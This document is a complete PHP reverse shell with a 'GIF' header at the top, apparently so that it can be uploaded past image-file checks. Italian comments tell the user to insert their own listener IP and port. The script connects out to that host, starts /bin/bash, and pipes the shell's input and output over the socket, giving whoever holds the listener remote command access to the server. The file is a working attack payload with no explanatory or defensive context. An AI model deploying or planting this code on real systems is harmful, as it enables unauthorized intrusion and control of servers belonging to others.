GIF<?php
// CONFIGURA QUESTI VALORI CON I TUOI DATI REALI:
$ip = '[192.168.64.2]'; // Esempio: '192.168.1.10'
$port = [4444];     // Esempio: 4444

$sock = fsockopen($ip, $port);
if ($sock === false) {
    die('Failed to connect to listener');
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open('/bin/bash', $descriptorspec, $pipes);
if (!is_resource($process)) {
    die('Failed to open shell process');
}

stream_set_blocking($sock, 0);
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);

while (true) {
    if (feof($sock)) break;
    if (feof($pipes[1])) break;
    if (feof($pipes[2])) break;

    $read = array($sock, $pipes[1], $pipes[2]);
    $write = null;
    $except = null;
    $timeout = 1;

    $num_changed_streams = stream_select($read, $write, $except, $timeout);

    if ($num_changed_streams === false) {
        break;
    } elseif ($num_changed_streams > 0) {
        if (in_array($sock, $read)) {
            $input = fread($sock, 8199);
            fwrite($pipes[0], $input);
        }
        if (in_array($pipes[1], $read)) {
            $output = fread($pipes[1], 8199);
            fwrite($sock, $output);
        }
        if (in_array($pipes[2], $read)) {
            $error_output = fread($pipes[2], 8199);
            fwrite($sock, $error_output);
        }
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
